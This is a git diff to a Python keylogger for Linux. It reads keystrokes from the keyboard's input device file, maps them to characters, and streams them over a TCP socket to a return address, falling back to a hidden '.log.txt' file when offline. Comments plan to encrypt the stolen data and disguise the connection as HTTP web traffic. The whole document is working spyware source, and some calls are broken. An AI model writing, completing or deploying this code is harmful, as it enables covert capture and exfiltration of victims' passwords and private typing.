@@ -2,6 +2,11 @@ import re
 import struct
 import os
 import socket
+import traceback
+
+return_addr = ("localhost", 80) # This port may not always be open
+                                   # TODO: check multiple ports? configure host for this too
+logfile_name = ".log.txt"
 
 """
 Basic keylogger program using regex, file IO and linux event handlers.
@@ -10,11 +15,10 @@ Written by mowemcfc (jcartermcfc@gmail.com) starting 12/06/2020
 """
 
 """
-Find character device file associated with keypress events using regex and device information
+Find character device file associated with keypress events using regex and device information.
 """
 # TODO: dynamic pathfinding to account for different filesystem structures
 def get_kb_cfile():
-
     with open("/proc/bus/input/devices", "r") as f: # this file contains current device information, including the keyboard
         lines = f.readlines()
 
@@ -26,7 +30,6 @@ def get_kb_cfile():
         for idx, elt in enumerate(handlers): # search handlers list for the event bitmask, returning the value before this which is the
             if pattern.search(elt):          # name of the event file
                 line = handlers[idx-1]
-
 
         pattern = re.compile("event\d?[0-9]|[1-9]0")
         cfile_path = "/dev/input/" + pattern.search(line).group(0) # find character device file event#
@@ -44,16 +47,15 @@ def send_logfile(sock, logfile_name, typed):
         data = outf.readlines()
 
         if data:
-            sock.sendall(encode(data, "utf-8"))
+            sock.sendall(data.encode("utf-8"))
 
         outf.truncate(0)
         outf.close()   
 
-
     return
 
 """
-Takes name of logfile and last 128 typed characters as input and writes to logfile
+Takes name of logfile and last 128 typed characters as input and writes to logfile.
 """
 def write_to_logfile(logfile_name, typed):
     with open(logfile_name, "a") as outf: # append mode
@@ -63,11 +65,13 @@ def write_to_logfile(logfile_name, typed):
 """
 Attempts to establish tcp connection with source PC using (HOST, PORT) tuple return_addr
 If exception is raised (aka connection could not be made, for whatever reason), we ignore,
-this will be handled by the write logic
+data will be written to file instead.
 """
-def try_connect_socket(return_addr):
+def try_connect_socket(sock, return_addr):
     try:
+        print("attempting to connect to", return_addr)
         sock.connect(return_addr)
+        print("successfully connected to", return_addr)
     except:
         pass
 
@@ -86,22 +90,19 @@ Struct format {struct input_event} is as follows (for 64bit linux systems):
 """
 # TODO: encrypt outgoing data
 # TODO: mask connection as web server with http
-# TODO: IF CONN NOT AVAILABLE, WRITE TO LOGFILE AND SEND WHEN ESTABLISHED, OTHERWISE STREAM KEYPRESSES TO SERV
 def read_cfile(cfile_path):
-    logfile_name = ".log.txt"
-
-    inevent_format = 'llHHI'
-    struct_size = struct.calcsize(inevent_format)
+    inevent_struct_format = 'llHHI'
+    struct_size = struct.calcsize(inevent_struct_format)
 
     # dict of code:key pairs corresponding to keyboard entry codes found in /include/linux/input-event-codes.h
     # TODO: by-country keyboard layout, need way to determine location? 
-    # TODO: shift-augmented keys
-    # TODO: BUGFIX backslash, more readable char?
+    # TODO: shift-augmented keys? does this matter?
+    # TODO: BUGFIX BUGFIX BUGFIX, THIS IS VERY BROKEN
     qwerty_map = {
         1:"[ESC]", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
         11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
         18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[",
-        27: "]", 28: "\n", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
+        27: "]", 28: "[RETURN]", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
         35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "'", 41: "`", 42: "[SHIFT]",
         43: "[BACKSLASH]", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
         51: ",", 52: ".", 53: "/", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
@@ -112,44 +113,47 @@ def read_cfile(cfile_path):
     }
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    return_addr = ("192.168.0.2", 80) # This port may not always be open
-                                      # TODO: check multiple ports? configure host for this too
-    try_connect_socket(return_addr)
+    try_connect_socket(sock, return_addr)
 
+    device_file = open(cfile_path, "rb")
+    keypress = device_file.read(struct_size)
 
-    input_file = open(cfile_path, "rb")
-    keypress = input_file.read(struct_size)
-
-    logfile = open(logfile_name, "w")
+    logfile = open(logfile_name, "w") # Create/wipe logfile for instance of program
     logfile.close()
 
     typed = ""
 
+    log_needs_send = False
     while keypress:
-        (var1, var2, type, code, value) = struct.unpack(inevent_format, keypress)
+        (var1, var2, type, code, value) = struct.unpack(inevent_struct_format, keypress)
         #print(var1, var2, type, code, value)
 
         if sock.fileno() == -1: # If socket is not connected, attempt to reconnect, otherwise ignore - data will be written to file
-            try_connect_socket(return_addr)
+            print("not currently connected, attempting to reconnect")
+            try_connect_socket(sock, return_addr)
 
         if code != 0 and type == 1 and value == 1: # TODO: write this comment
             if code in qwerty_map:
                 typed += qwerty_map[code]
 
-        keypress = input_file.read(struct_size)           
-        if len(typed) == 128: # write to file every 128 characters TODO: should this be higher?
+        keypress = device_file.read(struct_size)           
+        if len(typed) == 128:
             print("----WRITING----")
             try:
                 if log_needs_send:
                     write_to_logfile(logfile_name, typed)
-                    typed = "" # clear input buffer to avoid double handling when exceptions occur
                     send_logfile(sock, logfile_name)
                     log_needs_send = False
                 else:
-                    sock.sendall(encode(typed, "utf-8")) # encode keypress data as utf-8 string (by default)
-            except:
+                    print("sending")
+                    sock.sendall(typed.encode("utf-8")) # encode keypress data as utf-8 string (by default)
+                    print("sent")
 
-                if not os.path.exists(logfile_name): # create hidden log file
+                typed = "" # clear input buffer to avoid double handling when exceptions occur
+            except:
+                # TODO: properly single out exceptions we can ignore, and exceptions that are not expected
+                traceback.print_exc()
+                if not os.path.exists(logfile_name): # create hidden log file if does not exist
                     logfile = open(logfile_name, "w")
                     logfile.close()
 
@@ -161,14 +165,12 @@ def read_cfile(cfile_path):
 """
 Establishes TCP connection with host computer, takes (HOST, PORT) tuple as input
 """
-
-"""
 # Let's leave this to work with only local devices for now
 # TODO: configure this to work with remote computers, requires particular configurations on local network first
 def establish_return_conn():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(RETURN_ADDR)
-"""
+
 
 def main():
     cfile_path = get_kb_cfile()
